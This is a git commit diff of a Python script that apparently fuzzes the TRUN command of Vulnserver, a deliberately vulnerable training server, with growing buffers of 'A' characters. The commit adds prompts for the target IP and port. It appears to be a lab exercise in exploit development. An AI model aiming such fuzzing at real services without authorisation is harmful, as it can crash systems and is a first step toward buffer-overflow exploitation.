b227ee6237e0aa07c2b7029cb1072477369a6de2
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-13 17:19:50 +0530

    Update fuzzing-1.py

--- fuzzing-1.py
+++ fuzzing-1.py
@@ -3,14 +3,30 @@
 import sys,socket
 from time import sleep
 
-buffer=100
 
+print("****************Vuln_Server Vulnerability*************")
+sleep(0.5)
+ip_address=input("Enter the IP address:\n")
+port_number=input("Enter the port number:\n")
 
-while buffer <= 10000:
-    print(f"Sending bytes: {buffer}")
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('192.168.1.7', 9999))
-    s.send((b'TRUN /.:/ ' + b"A" * buffer))
-    s.close()
-    buffer=buffer+300
-    sleep(1)
+if(len(ip_address)<=0) or (len(port_number)<=0):
+    if(len(ip_address)>0) and (len(port_number)<=0):
+        print("*"*30)
+        print("Port number field is empty")
+    elif(len(ip_address)<=0) and (len(port_number)>0):
+        print("*"*30)
+        print("IP Address field is empty")
+    else:
+        print("*"*30)
+        print("Issues with the user input")
+elif(len(ip_address)>0) or (len(port_number)>0):
+        print("*"*30)
+        buffer=100
+        while(buffer<=100000):
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((ip_address, int(port_number)))
+            print(f"Sending buffer --> {buffer}")
+            s.send((b"TRUN /.:/" + b"A" *buffer + b"\r\n"))
+            s.close()
+            buffer=buffer+200
+            sleep(1)
